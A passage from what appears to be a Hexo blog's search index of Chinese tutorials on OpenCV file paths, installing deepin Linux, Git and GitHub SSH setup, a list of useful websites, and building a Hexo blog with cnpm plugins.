cv2.imdecode(np.fromfile(file_path, dtype=np.uint8), <span class="hljs-number">-1</span>)       cv_img = cv2.IMREAD_GRAYSCALE(img)<span class="hljs-keyword">return</span> cv_img</code></pre></div><p>其他也是类似</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.zhihu.com/question/67157462/answer/251754530" target="_blank" rel="noopener">Python 3.x 使用 opencv 无法读取中文路径如何解决？ 冰不语 </a> </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 计算机视觉 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> opencv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无操作系统电脑安装deepin系统</title>
      <link href="/2020/02/29/%E5%AE%89%E8%A3%85deepin%E7%B3%BB%E7%BB%9F/"/>
      <url>/2020/02/29/%E5%AE%89%E8%A3%85deepin%E7%B3%BB%E7%BB%9F/</url>
      
        <content type="html"><![CDATA[<p>如何安装国产操作系统deepin</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本篇将介绍如何在一台新的电脑(比如组装机)从只有一个BOIS系统安装deepin系统（对于安装大多数linux系统来说，都是这个思路），这跟有操作系统的电脑安装双系统是一样的，操作上都是靠bois这个基本的输入输出系统完成。</p><h2 id="可能遇上的问题"><a href="#可能遇上的问题" class="headerlink" title="可能遇上的问题"></a>可能遇上的问题</h2><p>安装Linux系统主要可能遇上的问题是<strong>显卡</strong>，因为目前个人电脑的显卡多是对windows系统定制的（苹果系统抛开另说），尽管NVIDIA和AMD有开源的显卡驱动，但是始终都是商用的性能比较好。</p><p>如果安装系统的时候<strong>显卡不怎么适配系统</strong>，那么就会导致安装完系统也无法开机。</p><h2 id="安装系统"><a href="#安装系统" class="headerlink" title="安装系统"></a>安装系统</h2><p>例如用AMD R3安装deepin系统，安装的套路是:</p><ol><li>首先准备一个储存空间8G以上的U盘，deepin官网下载<a href="https://www.deepin.org/zh/original/deepin-boot-maker/" target="_blank" rel="noopener">U盘制作工具</a>（软通碟等也可），<a href="https://www.deepin.org/zh/download/" target="_blank" rel="noopener">下载deepin系统</a>，制作U盘启动工具。</li><li>需要安装的电脑插入U盘，狂按delete键（有些电脑是esc键，每个品牌不同，具体查资料看看）进入bois系统，把U盘启动设置为首启动项。</li><li>按提示(套路)安装系统,安装完之后把进入bois系统把首启动项改回电脑系统。</li></ol><p>然鹅。。。</p><h2 id="解决显卡问题"><a href="#解决显卡问题" class="headerlink" title="解决显卡问题"></a>解决显卡问题</h2><p> 问题：在制作好deepin安装盘后，从u盘启动，选择”Install Deepin”后，会进入<strong>黑屏</strong>状态，无法显示任何内容。<br>   解决方法（禁用显卡驱动）：<strong>加启动参数’nomodeset’</strong>, 在选择界面按e或tab（底部有提示）编辑启动参数，这样一般可以进行正常安装</p><p> <img src="https://bbs.deepin.org/data/attachment/forum/201901/27/233231u74f77a0e7zh477d.png" srcset="/img/loading.gif" lazyload="" alt="img"> </p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://bbs.deepin.org/forum.php?mod=viewthread&amp;tid=174315&amp;from=singlemessage" target="_blank" rel="noopener">AMD锐龙 2200g安装和使用deepin</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web前端爬取工具</title>
      <link href="/2020/02/25/web%E5%89%8D%E7%AB%AF%E7%88%AC%E5%8F%96%E5%B7%A5%E5%85%B7/"/>
      <url>/2020/02/25/web%E5%89%8D%E7%AB%AF%E7%88%AC%E5%8F%96%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>web前端爬取</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本文介绍如何获取需要学(piao)习(qie)的网站前端资源</p><h2 id="前端爬取工具"><a href="#前端爬取工具" class="headerlink" title="前端爬取工具"></a>前端爬取工具</h2><h3 id="Teleport-Ultra"><a href="#Teleport-Ultra" class="headerlink" title="Teleport Ultra"></a>Teleport Ultra</h3><h3 id="OE7"><a href="#OE7" class="headerlink" title="OE7"></a>OE7</h3><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github基础操作</title>
      <link href="/2020/02/24/Git%E4%B8%8EGithub/"/>
      <url>/2020/02/24/Git%E4%B8%8EGithub/</url>
      
        <content type="html"><![CDATA[<p>把本地git仓库提交到github网站托管</p><a id="more"></a><p>坊间流传着“知道github的程序员歧视不知道github的程序员”。我就纳闷了：程序员还会不知道github？<br>好啦，都快要全面迈入小康社会了，再不知道github就要被消灭了[滑稽]</p><p><a href="https://blog.csdn.net/lqlqlq007/article/details/78983879" target="_blank" rel="noopener">首先要在远程仓库配置ssh</a>，然后建立远程仓库</p><p>我们常常会根据远程分支创建本地分支，命令如下</p><div class="hljs code-wrapper"><pre><code class="hljs q">git checkout -b <span class="hljs-built_in">dev</span> origin/<span class="hljs-built_in">dev</span></code></pre></div><p>上面的命令我是想把远程分支 dev 拉到本地来，但是有时候没有用，提示远程分支不存在，我们需要通过下面的命令来操作</p><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">git fetch origin</span></code></pre></div><p>可以运行 <code>git fetch origin</code> 来同步远程服务器上的数据到本地。</p><p>已经同步了分支，现在就可以拉取远程分支了</p><div class="hljs code-wrapper"><pre><code class="hljs q">git checkout -b <span class="hljs-built_in">dev</span> origin/<span class="hljs-built_in">dev</span></code></pre></div><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git基础命令</title>
      <link href="/2020/02/24/Git%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/2020/02/24/Git%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>软件开发、炼丹等熬夜工作必备工具</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Git是一个开源的分布式版本控制系统，现在基本上是软件开发、深度学习等各种与敲代码有关的项目都要是Git来完成版本管理了。 当然还有其他的版本控制工具，像是SVN等，但是现在基本上都是老一批的程序员大叔们在用了。</p><h2 id="为什么要用Git"><a href="#为什么要用Git" class="headerlink" title="为什么要用Git"></a>为什么要用Git</h2><p>软件开发，深度学习调参，代码肯定会有各种各种的改变，说不定这个版本还能运行，下个版本就GG了，与其找半天bug甚至根本找不出来还不如回滚旧版本。</p><p>Git有两种使用方式，Git Bash 、Git GUI </p><ul><li>Git Bash</li></ul><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/c730cd900c1d6171737c0351c49396c.png" srcset="/img/loading.gif" lazyload="" alt=""></p><p>对于新手特别是没接触过linux的童鞋来说，一开始就用Git bash可能会挺蓝瘦。但是，我建议用Git Bash</p><ul><li><p>Git GUI</p><p>相比Git Bash，Git GUI的界面就没那么简洁啦（git bash界面确实简洁，就用户名+命令行）</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/blog/484fdb423dc5c1c555fea3d98aa88bb.png" srcset="/img/loading.gif" lazyload="" alt="a995486c3a745d4cee7f2bdbb8557fb"></p><p>功能来说Git GUI也确实没有Git Bash灵活，唯一的好(坏)处就是不用敲命令行</p></li></ul><p>建议不管打算用Git Bash还是Git GUI都先了解下Git Bash的基础命令以便更快速地了解<strong>分布式版本控制</strong>，这里先只介绍Git Bash的基础命令</p><h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>下载并安装Git，在<code>我的电脑-鼠标右键添加属性-高级系统设置-环境变量-系统变量-Path</code>处添加变量，例如安装路径是<code>D:\Git</code>，那么就添加变量</p><p><code>D:\Git\usr\bin\</code></p><p><code>D:\Git\usr\bin\ssh-keygen.exe</code></p><p>这样就能在电脑的任意文件夹位置打开git</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/80ef2b6371e96bf39133297493ccf7e.png" srcset="/img/loading.gif" lazyload="" alt=""></p><h2 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h2><h3 id="新建"><a href="#新建" class="headerlink" title="新建"></a>新建</h3><p>在你存放项目代码的文件夹，输入代码新建Git本地仓库</p><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">git init</span></code></pre></div><p>新建之后会出现一个git文件夹，并且存放项目代码的文件夹会出现一个<strong>绿色的勾</strong>,表示已经同步到本地分支；命令行用户最后面有个<strong>master</strong>，表示在本地的master分支。</p><p> 此时可以通过命令git branch查看本地分支</p><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">git <span class="hljs-keyword">branch </span> <span class="hljs-comment">#查看本地分支</span>git <span class="hljs-keyword">branch </span>-r  <span class="hljs-comment">#查看远程分支</span>git <span class="hljs-keyword">branch </span>-a  <span class="hljs-comment">#查看所有分支</span></code></pre></div><p>在这里先不介绍远程，先学会本地版本控制</p><p>如果需要创建其他分支，可以用切换分支的命令加上参数创建分支</p><div class="hljs code-wrapper"><pre><code class="hljs q">git checkout <span class="hljs-built_in">dev</span> #切换到本地的<span class="hljs-built_in">dev</span>分支git checkout -b <span class="hljs-built_in">dev</span> #创建并切换到本地的<span class="hljs-built_in">dev</span>分支</code></pre></div><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><p>修改文件后，<strong>绿色的勾</strong>会变成<strong>红色的感叹号</strong>，表示更新到git的分支(如果切换到了master分支，就表示该文件没有更新到master分支，如果切换到dev分支就表示该文件没有更新到dev分支)</p><div class="hljs code-wrapper"><pre><code class="hljs avrasm">git <span class="hljs-keyword">add</span> -A  <span class="hljs-meta">#将所有文件添加到暂存区</span>git commit -m <span class="hljs-string">"first commit"</span> <span class="hljs-meta">#这一步是备注，注意这个步骤一定要有，否则会提交失败</span>git <span class="hljs-keyword">push</span> -u origin master <span class="hljs-meta">#表示提交到远程master分支，在此只是因为没有关联远程分支暂且不管</span></code></pre></div><h3 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h3><p>如果某个分支要更新到跟另一个分支的文件一样，使用merge</p><p>假设现在是在本地dev分支</p><div class="hljs code-wrapper"><pre><code class="hljs crmsh">git checkout <span class="hljs-keyword">master</span> <span class="hljs-title">#切换到本地master</span>git merge dev <span class="hljs-comment">#把本地dev分支合并到当前本地分支(master)中</span></code></pre></div><h3 id="关联远程"><a href="#关联远程" class="headerlink" title="关联远程"></a>关联远程</h3><div class="hljs code-wrapper"><pre><code class="hljs crmsh">git checkout <span class="hljs-literal">master</span>git remote add origin https://github.com/coneycode/hexo-git-backup.git <span class="hljs-comment">#使用https，之后介绍ssh</span>git fetch origin <span class="hljs-keyword">master</span> <span class="hljs-title">#取回(名称为)origin</span>服务器的<span class="hljs-literal">master</span>分支，即拉取远程<span class="hljs-literal">master</span>分支</code></pre></div><h2 id="远程"><a href="#远程" class="headerlink" title="远程"></a>远程</h2><h4 id="首次创建仓库提交"><a href="#首次创建仓库提交" class="headerlink" title="首次创建仓库提交"></a>首次创建仓库提交</h4><div class="hljs code-wrapper"><pre><code class="hljs dockerfile">git init   <span class="hljs-comment"># 本地创建仓库 </span>git <span class="hljs-keyword">add</span><span class="bash"> -A  <span class="hljs-comment"># 提交所有文件</span></span>git commit -m <span class="hljs-string">"first commit"</span>  <span class="hljs-comment"># 提交文件至本地缓存区</span>git remote <span class="hljs-keyword">add</span><span class="bash"> origin https://github.com/githubusername/githubrepositories.git <span class="hljs-comment">#添加远程仓库</span></span>git push -u origin master <span class="hljs-comment">#提交代码至远程仓库master分支</span></code></pre></div><h4 id="已有本地仓库提交"><a href="#已有本地仓库提交" class="headerlink" title="已有本地仓库提交"></a>已有本地仓库提交</h4><div class="hljs code-wrapper"><pre><code class="hljs avrasm">git remote <span class="hljs-keyword">add</span> origin https://github.com/githubusername/githubrepositories.git <span class="hljs-meta">#添加远程仓库</span>git <span class="hljs-keyword">push</span> -u origin master <span class="hljs-meta">#提交代码至远程仓库master分支</span></code></pre></div><p>如果是按照上面的方式提交，那么输入完<code>git push -u origin master</code>会弹出openssh的窗口，先输入<strong>账号名</strong>（就是仓库前的那个名字），再输入密码。每次都要这样岂不是很烦，所以推荐用SSH的方式提交。</p><h2 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h2><p>如果是使用https拉取远程分支或者提交代码的话，是要输入账号密码的，麻烦的很，但是只要使用ssh就能省去填写账号密码啦～</p><p>原理是本地生产ssh公钥和私钥，将<strong>公钥</strong>放在远程服务器（github、gitlab、coding、gitee），私钥放在本地，识别到能配对就不用填账号密码了。</p><ul><li><div class="hljs code-wrapper"><pre><code>  ssh-keygen -t rsa -C "your_email@example.com" #生产ssh密钥，文件位置在C:\Users\用户名\.ssh<pre><code class="hljs haml">      -<span class="ruby"> 登录github，头像处下拉框选择settings ；</span><span class="ruby">    </span><span class="ruby">- 点击侧边栏的<span class="hljs-string">`SSH and GPG keys`</span> ；</span><span class="ruby">    </span><span class="ruby">- 点击<span class="hljs-string">`New SSH key`</span>,title可以任意填，并且将之前生成的 id_rsa.pub 的内容用文本编辑器打开复制到key<span class="hljs-string">`输入框中。</span></span><span class="ruby">-</span></code></pre></div>  ssh -T git@github.com   #在本地电脑任意位置打开git bash输入此命令确认是否成功</code></pre><p>如果返回<code>Hi username! You’ve successfully authenticated, but GitHub does not provide shell access.</code>就说明成功啦！</p><p>接下来就可以愉快地push代码了（前提是网速行，像baidu.com都打开的网速绝对不愉快）</p></li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://git-scm.com/book/zh/v2" target="_blank" rel="noopener">git官方中文文档</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工具箱</title>
      <link href="/2020/02/23/tool/"/>
      <url>/2020/02/23/tool/</url>
      
        <content type="html"><![CDATA[<p>各种各样的工具，总有一款你喜欢</p><a id="more"></a><h1 id="大学生必备"><a href="#大学生必备" class="headerlink" title="大学生必备"></a>大学生必备</h1><h2 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h2><p><a href="https://www.jiumodiary.com/" target="_blank" rel="noopener">鸠摩搜书</a></p><h2 id="翻译类"><a href="#翻译类" class="headerlink" title="翻译类"></a>翻译类</h2><p> <a href="http://dict.cnki.net/" target="_blank" rel="noopener">CNKI翻译助手</a> </p><p><a href="http://fanyi.youdao.com/" target="_blank" rel="noopener">有道在线翻译</a></p><p><a href="https://www.onlinedoctranslator.com/" target="_blank" rel="noopener">免费在线文档翻译器</a></p><p><a href="https://cn.bing.com/dict?FORM=Z9LH3" target="_blank" rel="noopener">必应词典</a></p><h2 id="文件转换"><a href="#文件转换" class="headerlink" title="文件转换"></a>文件转换</h2><p><a href="http://www.alltoall.net/" target="_blank" rel="noopener">ALL TO ALL</a> </p><p><a href="http://www.bejson.com/convert/image_to_svg/" target="_blank" rel="noopener">jpg，png转换svg</a></p><p><a href="https://cn.office-converter.com/" target="_blank" rel="noopener">office-converter</a></p><p><a href="https://convertio.co/zh/" target="_blank" rel="noopener">convertio</a></p><p><a href="https://cloudconvert.com/" target="_blank" rel="noopener">cloudconvert</a></p><p><a href="https://onlineconvertfree.com/zh/convert/" target="_blank" rel="noopener">onlineconvertfree</a></p><p><a href="https://app.xunjiepdf.com/" target="_blank" rel="noopener">迅捷PDF转换器</a></p><h2 id="论文"><a href="#论文" class="headerlink" title="论文"></a>论文</h2><p><a href="https://scholar.google.com/" target="_blank" rel="noopener">谷歌学术</a></p><p><a href="http://scholar.hedasudi.com/" target="_blank" rel="noopener">谷歌学术镜像</a></p><p><a href="https://www.aminer.cn/" target="_blank" rel="noopener">AMiner</a></p><p> <a href="https://www.ctan.org/pkg/ctex" target="_blank" rel="noopener">ctex</a></p><h1 id="开发者工具"><a href="#开发者工具" class="headerlink" title="开发者工具"></a>开发者工具</h1><h2 id="资源库"><a href="#资源库" class="headerlink" title="资源库"></a>资源库</h2><p><a href="http://www.jq22.com/" target="_blank" rel="noopener">JQurey插件库</a></p><h2 id="在线编译"><a href="#在线编译" class="headerlink" title="在线编译"></a>在线编译</h2><p><a href="https://www.json.cn/" target="_blank" rel="noopener">json解析</a></p><p><a href="http://www.bejson.com/" target="_blank" rel="noopener">json格式校验</a></p><p> <a href="https://developers.google.cn/google-ads/scripts/docs/examples/google-bigquery" target="_blank" rel="noopener">google-bigquery</a> </p><p><a href="http://www.wangeditor.com/" target="_blank" rel="noopener">富文本编辑器</a></p><p><a href="http://jsrun.pro/" target="_blank" rel="noopener">JSRUN在线编译器</a></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p><a href="https://dash.cloudflare.com/sign-up" target="_blank" rel="noopener">CLOUDFLARE</a></p><h1 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h1><h2 id="网盘搜索"><a href="#网盘搜索" class="headerlink" title="网盘搜索"></a>网盘搜索</h2><p><a href="http://www.pansoso.com/" target="_blank" rel="noopener">盘搜搜</a></p><h2 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h2><p><a href="https://toolbox.google.com/datasetsearch" target="_blank" rel="noopener">datasetsearch</a></p><p><a href="https://data.world/?newUser=true" target="_blank" rel="noopener">dataworld</a></p><p><a href="https://www.data.gov/" target="_blank" rel="noopener">datagov</a></p><p><a href="http://dataju.cn/Dataju/web/home" target="_blank" rel="noopener">聚数力</a></p><p><a href="http://hao.199it.com/" target="_blank" rel="noopener">大数据导航</a></p><p><a href="http://number.cnki.net/cyfd/" target="_blank" rel="noopener">中国宏观数据挖掘分析系统</a></p><h1 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h1><h2 id="素材网站"><a href="#素材网站" class="headerlink" title="素材网站"></a>素材网站</h2><p><a href="https://www.58pic.com/tupian/qianqiantuku.html" target="_blank" rel="noopener">千图网</a></p><p><a href="https://ibaotu.com/" target="_blank" rel="noopener">包图网</a></p><p><a href="http://699pic.com/" target="_blank" rel="noopener">摄图网</a></p><p><a href="http://www.nipic.com/" target="_blank" rel="noopener">昵图网</a></p><h2 id="在线设计"><a href="#在线设计" class="headerlink" title="在线设计"></a>在线设计</h2><p><a href="https://c.runoob.com/more/svgeditor/" target="_blank" rel="noopener">svg在线编辑</a></p><p><a href="https://www.logoaa.com/" target="_blank" rel="noopener">logo在线制作</a></p><p><a href="https://encycolorpedia.cn/ffffff" target="_blank" rel="noopener">RGB色彩查询</a></p><h1 id="科学上网"><a href="#科学上网" class="headerlink" title="科学上网"></a>科学上网</h1><p><a href="http://googlehelper.net/" target="_blank" rel="noopener">Ghelper</a></p><p><a href="https://www.gugeapps.net/" target="_blank" rel="noopener">chrome应用商店镜像</a></p><h1 id="综合"><a href="#综合" class="headerlink" title="综合"></a>综合</h1><h2 id="云"><a href="#云" class="headerlink" title="云"></a>云</h2><p><a href="https://www.google.com/drive/" target="_blank" rel="noopener">谷歌云端硬盘</a></p><p><a href="https://www.multcloud.com/product" target="_blank" rel="noopener">MultCloud</a></p><h2 id="工具盒"><a href="#工具盒" class="headerlink" title="工具盒"></a>工具盒</h2><p><a href="https://web.woobx.cn/" target="_blank" rel="noopener">一个木函</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> tool </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客搭建</title>
      <link href="/2020/02/20/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2020/02/20/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<p>0元搭建自己的博客</p><a id="more"></a><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Hexo是一种静态网页框架，可以把md文件渲染成网页文件</p><p>优点：简单易用，0成本</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><ul><li>安装Git</li><li>安装Nodejs</li></ul><h3 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h3><p>直接<a href="https://blog.csdn.net/sanxd/article/details/82624127" target="_blank" rel="noopener">下载安装</a>，记得<code>我的电脑-属性-高级系统设置-环境变量-系统/我的环境变量</code>里添加Git的安装路径（就是告诉自己的电脑Git在哪，这样就任何一个文件夹位置都能使用Git了）</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200621220319488.png" srcset="/img/loading.gif" lazyload="" alt="image-20200621220319488"></p><p>例如Git安装在<code>D:\Git\git-2.22.0\</code>这个位置</p><p>则环境变量里添加：</p><p><code>D:\Git\git-2.22.0\usr\bin\</code></p><p><code>D:\Git\git-2.22.0\usr\bin\ssh-keygen.exe</code></p><h3 id="安装Nodejs"><a href="#安装Nodejs" class="headerlink" title="安装Nodejs"></a>安装Nodejs</h3><p>建议新手安装最新的稳定版本，同样也得在环境变量里添加，比如安装在<code>D:\nodejs</code>就添加<code>D:\nodejs</code></p><h2 id="初始化Hexo"><a href="#初始化Hexo" class="headerlink" title="初始化Hexo"></a>初始化Hexo</h2><p>在某个文件夹位置点击鼠标右键，打开git bash，输入</p><div class="hljs code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo init</span></code></pre></div><p>git会自动拉取hexo的安装包</p><p>安装完成会出现以下这些文件</p><blockquote><p>scaffolds                       配置文件，先别管</p><p>themes                          hexo主题文件</p><p>_config.yml                    hexo全局配置文件</p><p>package.json                 记录依赖包</p></blockquote><p>如果网速差点的话，git在下载landscape的时候会看住（自己看看是不是），如果是的话直接在git bash 按<kbd>Ctrl</kbd>+<kbd>C</kbd>强行终止下载（这个主题文件可以先不要，换成别的主题文件就好了，除非你喜欢hexo默认的主题）</p><p><strong>PS</strong>：配置好之后也会有一堆需要修改、美化，如果你觉得我的这个修改后的看着还行，可以直接<code>clone</code><a href="https://gitee.com/Sao-operation/hexo-matery" target="_blank" rel="noopener">本站修改后的主题配置</a></p><h2 id="配置主题"><a href="#配置主题" class="headerlink" title="配置主题"></a>配置主题</h2><p>下载主题，放到hexo目录的theme文件夹内， <a href="https://hexo.io/zh-cn/docs/themes.html" target="_blank" rel="noopener">Hexo主题下载</a> ，比如我下载Sakura主题，并且把下载的文件修改成Sakura</p><p>在hexo根目录打开_config.yml，把<code>theme: landscape</code>修改成<code>theme: Sakura</code>（注意英文冒号后面有个<strong>空格</strong>，没有的话会报错）</p><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p>安装Hexo运行必备的插件，首先安装淘宝镜像（因为npm实在太慢了）</p><p>安装cnpm，命令：</p><div class="hljs code-wrapper"><pre><code class="hljs bash">npm install -g cnpm --registry=https://registry.npm.taobao.org1</code></pre></div><p>安装后，使用以下命令测试是否安装成功</p><div class="hljs code-wrapper"><pre><code class="hljs bash">cnpm -v1</code></pre></div><p>成功后，以后都使用 cnpm 代替以前 npm 来执行命令！</p><ul><li>安装必要插件</li></ul><div class="hljs code-wrapper"><pre><code class="hljs sql">cnpm i <span class="hljs-comment">--save hexo-deployer-git </span>cnpm i <span class="hljs-comment">--save  hexo-generator-archive</span>cnpm i <span class="hljs-comment">--save hexo-generator-index</span>cnpm i <span class="hljs-comment">--save hexo-generator-tag</span>cnpm i <span class="hljs-comment">--save hexo-renderer-ejs</span>cnpm i <span class="hljs-comment">--save hexo-renderer-kramed</span>cnpm i <span class="hljs-comment">--save hexo-renderer-stylus</span>cnpm i <span class="hljs-comment">--save hexo-server</span>cnpm i <span class="hljs-comment">--save hexo-wordcount</span>cnpm i <span class="hljs-comment">--save hexo-generator-category</span><span class="hljs-comment">#下面的是非必要插件</span>cnpm i <span class="hljs-comment">--save hexo-wordcount</span>cnpm i -S hexo-prism-plugincnpm i hexo-permalink-pinyin <span class="hljs-comment">--save</span>cnpm i <span class="hljs-comment">--save hexo-generator-feed</span>cnpm <span class="hljs-keyword">install</span> hexo-generator-<span class="hljs-keyword">search</span> <span class="hljs-comment">--save</span></code></pre></div><p>然后，输入``hexo g<code>，等待md文件渲染成html文件再输入</code>hexo s`</p><p>打开浏览器输入<code>http://localhost:4000/</code></p><h2 id="定制美化"><a href="#定制美化" class="headerlink" title="定制美化"></a>定制美化</h2><p>根据自己的需要定制啦，记得多用git add -A和git commit -m “提交缓存区”  保存，万一搞得报错了至少能用git reflog回滚。</p><h2 id="图床"><a href="#图床" class="headerlink" title="图床"></a>图床</h2><p>如果网速可以建议用PicGo+github pages搭建图床（但是上传速度很慢）；也可以用七牛云、又拍云等搭建图床，但是这种我个人觉得要么收费要么不好用。</p><p><a href="../../../07/06/da-jian-tu-chuang">我用coding/gitee+pcigo</a></p><h2 id="本站修改后的主题"><a href="#本站修改后的主题" class="headerlink" title="本站修改后的主题"></a>本站修改后的主题</h2><p><a href="https://gitee.com/Sao-operation/hexo-matery" target="_blank" rel="noopener">国内仓库地址</a>，直接<code>git clone</code>下来 </p><p>在电脑上找个合适的文件夹位置(放博客的位置)</p><p>安装淘宝镜像</p><div class="hljs code-wrapper"><pre><code class="hljs coffeescript"><span class="hljs-built_in">npm</span> install cnpm -g --registry=http://registry.<span class="hljs-built_in">npm</span>.taobao.org <span class="hljs-comment">#全局安装</span><span class="hljs-built_in">npm</span> install cnpm --registry=http://registry.<span class="hljs-built_in">npm</span>.taobao.org<span class="hljs-comment">#局部安装</span></code></pre></div><p>安装上hexo必备的一些插件</p><div class="hljs code-wrapper"><pre><code class="hljs sql">cnpm i <span class="hljs-comment">--save hexo-wordcount</span>cnpm i <span class="hljs-comment">--save hexo-deployer-git </span>cnpm i -S hexo-prism-plugincnpm i hexo-permalink-pinyin <span class="hljs-comment">--save</span>cnpm i <span class="hljs-comment">--save hexo-generator-feed</span>cnpm <span class="hljs-keyword">install</span> hexo-generator-<span class="hljs-keyword">search</span> <span class="hljs-comment">--save</span>cnpm i <span class="hljs-comment">--save  hexo-generator-archive</span>cnpm i <span class="hljs-comment">--save hexo-generator-index</span>cnpm i <span class="hljs-comment">--save hexo-generator-tag</span>cnpm i <span class="hljs-comment">--save hexo-renderer-ejs</span>cnpm i <span class="hljs-comment">--save hexo-renderer-kramed</span>cnpm i <span class="hljs-comment">--save hexo-renderer-stylus</span>cnpm i <span class="hljs-comment">--save hexo-server</span>cnpm i <span class="hljs-comment">--save hexo-wordcount</span>cnpm i <span class="hljs-comment">--save hexo-generator-category</span>cnpm i <span class="hljs-comment">--save hexo-filter-mermaid-diagrams</span></code></pre></div><p>然后需要修改一些必要的配置</p><p>首先在<strong>根目录</strong>的_config.yml修改自己的网站名，作者名等，url处填写自己的网站名</p><p><img src="https://auto2dev.coding.net/p/ImageHostingService/d/ImageHostingService/git/raw/master/md/image-20200703185000368.png" srcset="/img/loading.gif" lazyload="" alt="网站地址"></p><p>填写打开了 GitHub pages 或coding pages 的地址</p><p><img 